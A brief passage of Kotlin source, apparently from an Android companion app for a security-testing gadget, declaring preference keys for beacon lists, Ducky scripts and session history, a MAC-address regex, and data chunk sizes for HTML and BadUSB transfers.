        private const val PREF_EXPORT_DIRECTORY = "export_directory_uri"
        private const val PREF_BEACON_LISTS = "beacon_lists"
        private const val PREF_DUCKY_SCRIPTS = "ducky_scripts"
        private const val PREF_HISTORY = "session_history"
        private const val PREF_LAST_DEVICE_FINGERPRINT = "last_device_fingerprint"
        private const val PREF_RECENT_MODULES = "recent_modules"
        private val MAC_PATTERN = Regex("^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
        private const val HTML_RAW_CHUNK_SIZE = 512
        private const val HTML_TAIL_ALLOWANCE = 64
        private const val BADUSB_RAW_CHUNK_SIZE = 693
    }
}
